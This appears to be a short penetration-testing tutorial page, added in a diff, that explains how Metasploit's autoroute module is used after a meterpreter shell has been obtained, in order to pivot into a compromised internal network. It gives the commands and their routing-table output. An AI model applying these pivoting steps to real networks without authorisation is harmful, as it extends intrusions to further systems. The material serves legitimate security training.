@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Autoroute</title>
+</head><body>Once we successfully obtained a shell we background the meterpreter session in order to take advantage of the autoroute post module, this will allow us to attack targets within the compromised network.<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Autoroute can also be utilized in a meterpreter session to add the route to the compromized machines routing table:<br/>
+<br/>
+meterpreter &gt; run autoroute -s 7.7.7.0/24<br/>
+[*] Adding a route to 7.7.7.0/255.255.255.0...<br/>
+[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11<br/>
+[*] Use the -p option to list all active routes<br/>
+meterpreter &gt; run autoroute -p<br/>
+Active Routing Table<br/>
+====================<br/>
+&nbsp;Subnet Netmask Gateway<br/>
+&nbsp;------ ------- -------<br/>
+&nbsp;7.7.7.0 255.255.255.0 Session 2<br/>
+meterpreter &gt;<br/>
+<br/>
+<br/>
+There is one important point to be noted at this point, the routing we provide with the run autoroute command gives us the freedom to work in the Metasploit Framework. But when we try to reach the target with a Kali tools, we need tools like port forwarding or proxychains.</body></html>
